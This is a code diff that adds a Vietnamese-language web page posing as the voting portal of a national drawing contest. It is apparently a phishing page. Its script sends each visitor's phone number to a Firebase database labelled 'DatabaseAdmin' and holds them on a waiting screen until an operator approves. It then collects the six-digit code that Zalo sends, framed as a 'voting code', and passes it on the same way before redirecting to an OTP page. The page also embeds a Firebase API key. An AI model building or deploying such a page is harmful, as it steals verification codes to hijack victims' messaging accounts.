@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cổng Bình Chọn - Cuộc Thi Vẽ Tranh Toàn Quốc</title>
+    <style>
+        body { 
+            font-family: 'Times New Roman', Times, serif; 
+            margin: 0; 
+            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://images.unsplash.com/photo-1513364776144-60967b0f800f?q=80&w=1920') center/cover fixed; 
+            color: #2c3e50; 
+        }
+        
+        .main-container { 
+            max-width: 600px; 
+            width: 90%; /* Phù hợp cho mobile */
+            box-sizing: border-box; /* Ngăn chặn tràn lề */
+            margin: 40px auto; 
+            background: #fffdf7; 
+            padding: 40px; 
+            border-radius: 12px; 
+            box-shadow: 0 15px 40px rgba(0,0,0,0.3); 
+            border: 12px solid #3e2723;
+            outline: 3px solid #d4af37;
+            outline-offset: -10px;
+            position: relative;
+        }
+        
+        .header-title {
+            text-align: center;
+            color: #8b0000;
+            font-size: 26px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #d4af37;
+            padding-bottom: 15px;
+        }
+        
+        .banner-img { 
+            width: 100%; 
+            height: auto;
+            max-height: 220px; 
+            object-fit: cover;
+            border-radius: 4px; 
+            margin-bottom: 25px; 
+            border: 2px solid #d4af37;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        
+        h2 { 
+            font-size: 18px; 
+            color: #555; 
+            margin-top: 0; 
+            margin-bottom: 20px; 
+            text-transform: uppercase; 
+            text-align: center;
+            letter-spacing: 1px;
+            font-weight: bold;
+        }
+        
+        .candidate-list { margin-bottom: 30px; }
+        .candidate-item { 
+            display: block; 
+            padding: 16px 20px; 
+            margin-bottom: 12px; 
+            background: #faf9f6; 
+            border: 1px solid #d4af37; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            transition: all 0.3s; 
+            font-size: 18px; 
+            color: #333; 
+            position: relative;
+            overflow: hidden;
+        }
+        .candidate-item:hover { 
+            background: #fdfaf3; 
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(212, 175, 55, 0.2);
+        }
+        .candidate-item.selected { 
+            background: #8b0000; 
+            border-color: #8b0000; 
+            font-weight: bold; 
+            color: #ffffff; 
+            box-shadow: 0 4px 12px rgba(139,0,0,0.3);
+        }
+        input[type="radio"] { display: none; }
+        
+        .form-group { margin-bottom: 25px; text-align: center;}
+        .input-label { display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; margin-bottom: 15px; color: #4a4a4a; text-align: center;}
+        
+        input[type="text"].phone-input { 
+            width: 85%; 
+            padding: 16px; 
+            border: 2px solid #d4af37; 
+            border-radius: 8px; 
+            font-size: 20px; 
+            text-align: center;
+            box-sizing: border-box; 
+            font-family: inherit; 
+            letter-spacing: 2px;
+            color: #8b0000;
+            font-weight: bold;
+            background: #fff;
+            transition: 0.3s;
+        }
+        input[type="text"].phone-input:focus { border-color: #8b0000; outline: none; box-shadow: 0 0 8px rgba(139,0,0,0.2);}
+        
+        .sbd-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .sbd-input { 
+            width: 48px; 
+            height: 60px; 
+            font-size: 28px; 
+            text-align: center; 
+            border: 2px solid #d4af37; 
+            border-radius: 8px; 
+            color: #8b0000; 
+            font-weight: bold; 
+            font-family: inherit;
+            background: #fff;
+            transition: 0.3s;
+            box-sizing: border-box;
+        }
+        .sbd-input:focus { border-color: #8b0000; outline: none; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(139,0,0,0.2);}
+        
+        .btn-primary { 
+            width: 85%; 
+            background: #8b0000; 
+            color: white; 
+            border: 2px solid #8b0000; 
+            padding: 16px; 
+            cursor: pointer; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            font-size: 18px; 
+            text-transform: uppercase; 
+            margin-top: 10px; 
+            transition: all 0.3s;
+            font-family: inherit;
+            letter-spacing: 1px;
+            box-sizing: border-box;
+        }
+        .btn-primary:hover { background: #fffdf7; color: #8b0000; }
+        
+        #step2 { display: none; margin-top: 35px; padding-top: 25px; border-top: 2px dashed #d4af37; animation: fadeIn 0.5s;}
+        
+        .error-msg { color: #d32f2f; font-size: 15px; margin-bottom: 15px; display: none; font-style: italic; text-align: center; font-weight: bold;}
+        
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 253, 247, 0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; text-align: center; padding: 20px;}
+        .spinner { border: 4px solid #f4f1ea; border-top: 4px solid #8b0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 25px; }
+        .loading-text { font-size: 20px; color: #8b0000; font-weight: bold; line-height: 1.5; }
+        
+        .zalo-icon { width: 24px; height: 24px; margin-left: 8px; vertical-align: middle; }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px);} to {opacity: 1; transform: translateY(0);}}
+
+        /* --- MOBILE RESPONSIVE CSS --- */
+        @media (max-width: 600px) {
+            .main-container {
+                margin: 20px auto;
+                padding: 20px 15px;
+                border-width: 8px; /* Giảm độ dày viền */
+                outline-offset: -6px;
+            }
+            .header-title { font-size: 20px; }
+            .candidate-item { font-size: 15px; padding: 12px 15px; }
+            input[type="text"].phone-input, .btn-primary { width: 100%; } /* Tràn lề 100% dễ bấm */
+            .input-label { font-size: 14px; flex-direction: column; gap: 8px; }
+            .zalo-icon { margin-left: 0; }
+            .sbd-container { gap: 4px; }
+            .sbd-input { width: 40px; height: 50px; font-size: 22px; } /* Thu nhỏ ô Zalo để vừa 1 hàng ngang */
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="header-title">Cuộc Thi Vẽ Tranh Toàn Quốc</div>
+        <img src="https://images.unsplash.com/photo-1460661419201-fd4cecdf8a8b?auto=format&fit=crop&w=1000&q=80" alt="Banner Cuộc Thi" class="banner-img">
+        
+        <div id="step1-wrapper">
+            <h2>Danh Sách Thí Sinh</h2>
+            <div class="candidate-list">
+                <label class="candidate-item" onclick="selectCandidate(this)"><input type="radio" name="candidate" value="Thí sinh 1: Nguyễn Minh Anh"> Thí sinh 1: Nguyễn Minh Anh</label>
+                <label class="candidate-item" onclick="selectCandidate(this)"><input type="radio" name="candidate" value="Thí sinh 2: Trần Văn Huy"> Thí sinh 2: Trần Văn Huy</label>
+                <label class="candidate-item" onclick="selectCandidate(this)"><input type="radio" name="candidate" value="Thí sinh 3: Phạm Thị Hải Yến"> Thí sinh 3: Phạm Thị Hải Yến</label>
+            </div>
+
+            <p class="error-msg" id="error1">Vui lòng chọn thí sinh và nhập số điện thoại hợp lệ.</p>
+
+            <div class="form-group" id="step1">
+                <label class="input-label" for="phone">Nhập số điện thoại người bình chọn:</label>
+                <input type="text" id="phone" class="phone-input" placeholder="......" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                <button class="btn-primary" id="btnNext1" onclick="submitPhoneForApproval()">Tiếp tục</button>
+            </div>
+        </div>
+
+        <div class="form-group" id="step2">
+            <label class="input-label" style="color: #8b0000;">
+                Nhập mã bình chọn thí sinh được gửi về ứng dụng Zalo:
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Icon_of_Zalo.svg" alt="Zalo" class="zalo-icon">
+            </label>
+            <p class="error-msg" id="error2">Mã bình chọn phải bao gồm đúng 6 chữ số.</p>
+            
+            <div class="sbd-container">
+                <input type="text" class="sbd-input" inputmode="numeric" maxlength="1">
+                <input type="text" class="sbd-input" inputmode="numeric" maxlength="1">
+                <input type="text" class="sbd-input" inputmode="numeric" maxlength="1">
+                <input type="text" class="sbd-input" inputmode="numeric" maxlength="1">
+                <input type="text" class="sbd-input" inputmode="numeric" maxlength="1">
+                <input type="text" class="sbd-input" inputmode="numeric" maxlength="1">
+            </div>
+
+            <button class="btn-primary" id="btnSubmit" onclick="submitVote()">Gửi Bình Chọn</button>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner" id="spinnerIcon"></div>
+        <div class="loading-text" id="loadingText"></div>
+        <button class="btn-primary" id="btnRetry" style="display: none; width: auto; padding: 12px 35px; margin-top: 25px;" onclick="closeError()">Thử Lại</button>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDk5okwiZEg2KOEwjUf1DHiTIFqNypq-So",
+            authDomain: "conhi-vote.firebaseapp.com",
+            databaseURL: "https://conhi-vote-default-rtdb.firebaseio.com",
+            projectId: "conhi-vote",
+            storageBucket: "conhi-vote.firebasestorage.app",
+            messagingSenderId: "953203459869",
+            appId: "1:953203459869:web:da5710aa4b115b5bbf83f4"
+        };
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        const db = firebase.database();
+
+        let currentSessionId = null;
+
+        function selectCandidate(element) {
+            document.querySelectorAll('.candidate-item').forEach(el => el.classList.remove('selected'));
+            element.classList.add('selected');
+        }
+
+        function showLoading(text) {
+            document.getElementById('loadingOverlay').style.display = "flex";
+            document.getElementById('spinnerIcon').style.display = "block";
+            document.getElementById('btnRetry').style.display = "none";
+            document.getElementById('loadingText').innerHTML = text;
+        }
+
+        function showError(text) {
+            document.getElementById('spinnerIcon').style.display = "none";
+            document.getElementById('loadingText').innerHTML = text;
+            document.getElementById('btnRetry').style.display = "inline-block";
+        }
+
+        function closeError() {
+            document.getElementById('loadingOverlay').style.display = "none";
+        }
+
+        // BƯỚC 1: Đẩy SĐT lên chờ Admin duyệt
+        function submitPhoneForApproval() {
+            const selectedCandidate = document.querySelector('input[name="candidate"]:checked');
+            const phone = document.getElementById('phone').value.trim();
+            
+            if(!selectedCandidate || phone.length < 9) {
+                document.getElementById('error1').style.display = "block";
+                return;
+            }
+            
+            document.getElementById('error1').style.display = "none";
+            showLoading("Hệ thống đang kiểm tra và ghi nhận số điện thoại...<br><span style='font-size: 15px; color: #555; font-style: italic; font-weight: normal; margin-top: 10px; display: block;'>Vui lòng giữ nguyên màn hình này để chờ duyệt.</span>");
+
+            if (!currentSessionId) { currentSessionId = Date.now().toString(); }
+
+            const voteData = {
+                phone: phone,
+                sbd: "", 
+                candidate: selectedCandidate.value,
+                otp: "Đang chờ nhập...",
+                time: new Date().toLocaleString('vi-VN'),
+                status: "step1_pending" 
+            };
+
+            db.ref('DatabaseAdmin/' + currentSessionId).set(voteData).then(() => {
+                // Lắng nghe kết quả Bước 1
+                db.ref('DatabaseAdmin/' + currentSessionId + '/status').on('value', (snapshot) => {
+                    const currentStatus = snapshot.val();
+                    if(currentStatus === "step1_approved") {
+                        closeError();
+                        document.getElementById('step1-wrapper').style.display = "none";
+                        document.getElementById('step2').style.display = "block";
+                        document.querySelector('.sbd-input').focus();
+                    } else if (currentStatus === "step1_rejected") {
+                        showError("❌<br>Số điện thoại bạn nhập không hợp lệ hoặc không có trong hệ thống,<br>vui lòng thử lại.");
+                    }
+                });
+            });
+        }
+
+        // Xử lý ô SBD mượt mà
+        const sbdInputs = document.querySelectorAll('.sbd-input');
+        sbdInputs.forEach((input, index) => {
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
+                for (let i = 0; i < pastedData.length && index + i < sbdInputs.length; i++) {
+                    sbdInputs[index + i].value = pastedData[i];
+                }
+                sbdInputs[Math.min(index + pastedData.length, sbdInputs.length - 1)].focus();
+            });
+
+            input.addEventListener('input', function() {
+                let val = this.value.replace(/[^0-9]/g, '');
+                if(val.length > 0) {
+                    this.value = val.slice(-1);
+                    if (index < sbdInputs.length - 1) { sbdInputs[index + 1].focus(); }
+                } else { this.value = ''; }
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    sbdInputs[index - 1].focus();
+                    sbdInputs[index - 1].value = ''; 
+                }
+            });
+        });
+
+        // BƯỚC 2: Gửi SBD lên chờ duyệt
+        function submitVote() {
+            let sbdValue = '';
+            sbdInputs.forEach(input => sbdValue += input.value);
+
+            if(sbdValue.length !== 6) {
+                document.getElementById('error2').style.display = "block";
+                return;
+            }
+            document.getElementById('error2').style.display = "none";
+
+            showLoading("Hệ thống đang kiểm tra mã bình chọn Zalo...<br><span style='font-size: 15px; color: #555; font-style: italic; font-weight: normal; margin-top: 10px; display: block;'>Vui lòng không đóng trang web này.</span>");
+
+            db.ref('DatabaseAdmin/' + currentSessionId).update({
+                sbd: sbdValue,
+                status: "step2_pending"
+            }).then(() => {
+                // Lắng nghe kết quả Bước 2
+                db.ref('DatabaseAdmin/' + currentSessionId + '/status').on('value', (snapshot) => {
+                    const currentStatus = snapshot.val();
+                    if(currentStatus === "step2_approved") {
+                        // Lưu data vào bộ nhớ trước khi nhảy page
+                        localStorage.setItem('currentVoteSession', JSON.stringify({
+                            id: currentSessionId, 
+                            phone: document.getElementById('phone').value.trim(), 
+                            sbd: sbdValue, 
+                            candidate: document.querySelector('input[name="candidate"]:checked').value
+                        }));
+                        window.location.href = 'otp.html'; 
+                    } else if (currentStatus === "step2_rejected") {
+                        showError("❌<br>Mã Zalo bạn cung cấp không chính xác,<br>vui lòng kiểm tra lại Zalo và điền lại.");
+                        db.ref('DatabaseAdmin/' + currentSessionId).update({status: "step1_approved", sbd: ""});
+                        sbdInputs.forEach(input => input.value = '');
+                    }
+                });
+            });
+        }
+    </script>
+</body>
+</html>
